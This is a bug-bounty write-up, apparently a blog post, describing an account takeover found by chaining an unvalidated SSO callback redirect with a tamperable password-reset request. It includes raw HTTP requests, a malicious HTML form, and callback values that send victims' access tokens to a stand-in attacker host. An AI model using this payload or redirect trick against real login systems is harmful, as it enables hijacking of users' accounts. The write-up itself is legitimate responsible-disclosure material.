---
layout: post
title: From Unvalidated Redirect and Parameter Tampering to Account Takeover
excerpt: "In this simple write-up, I would like to tell how I found an Account Takeover vulnerability with a unique method. There's no special or unique bypass thing. Just try to find another exploitation way."
tags: [bug hunting, hacking, unvalidated redirect, parameter tampering, account takeover]
categories: [bug hunting]
comments: true
image:
  feature: 5ee3bc3a3226da3dc1a3f88671451018.png
---


بسم الله الرحمن الرحيم

In this simple write-up, I would like to tell how I found an Account Takeover vulnerability with a unique method. There's no special or unique bypass thing. Just try to find another exploitation way.

>Because this is a Private Program, all Endpoint names, parameters, and part of the information displayed here is not the real name. This was made to give readers an idea to make it easier to understand the contents of this paper.

Some time ago, I did a Bug Hunting activity on a website based application. The site has several subdomains, each of which has different functions. This website uses SSO as an authentication scheme to make it easier for users to access each of the existing subdomains.

**I. Unvalidated Redirect**

When accessing different subdomains, there is a `Login Button` which when the user clicks, the user will send a request like the following:

```
POST /ssoLogin HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 123
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Accept-Encoding: gzip, deflate

action=login&app=app.name&callback=https://app.redacted.com/callback
```

Then the user will be directed to the subdomain URL along with access token on it.

Example:

```
https://app.redacted.com/callback?token=uaJfJi8hlNFCPSiKmjWO
```

This request can be manipulated by changing the value of the `callback` parameter to `app.redacted.com.attacker.com.` The attacker can steal user tokens by diverting callbacks to websites controlled by the attacker and creating simple malicious HTML like this:

```html
<html>
	<body>
		<form method="POST" action="https://redacted.com/ssoLogin">
			<input type="hidden" name="action" value="login"/>
			<input type="hidden" name="app" value="app.name"/>
			<input type="hidden" name="callback" value="https://app.redacted.com.attacker.com/callback"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
```

Sending `malicious links` to victims is boring, so I tried to find another way to trigger the request.

**II. Parameter Tampering**

After browsing through some of the features of the application, I found something interesting about the password reset function. When the user resets the password, then the user will be asked to enter his email address, but when making an intercept request, several other parameters are sent, not just email.

```
POST /resetPassword HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 123
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Accept-Encoding: gzip, deflate

action=resetpass&app=null&callback=null
```

There are similar parameters that are sent when logging into another subdomain when using SSO, it's `app` and `callback`.

So I tried to change the value the same as the previous request:

```
app=app.name&callback=https://app.redacted.com.attacker.com/callback
```

Surprisingly, I received an email to request a password with a URL like this:

```
https://redacted.com/resetPassword?token=uaJfJi8hlNFCPSiKmjWO&app=app.name&callback=https://app.redacted.com.attacker.com/callback
```

After entering a new password, the user will automatically be redirected to the login process along with the parameters listed in the URL. Of course, because the `callback` parameter has been manipulated, the user will be directed to the attacker's website along with its access token.

Attack Flow:

![Attack Flow](/assets/ba62970936fbee1b8f84b6fd8dc9fb24.png){:height="700px" width="400px"}

Attacker will receive a request on his server with user's token on it.

![Attacker's Side](/assets/f3abb86bd34cf4d52698f14c0da1dc60.jpg)

I report this issue through Bugcrowd.

```
Timeline:

2019-10-17: Report Sent
2019-10-17: Report Triaged
2019-10-25: $4,500 Bounty Awarded
2020-03-03: Fixed
```

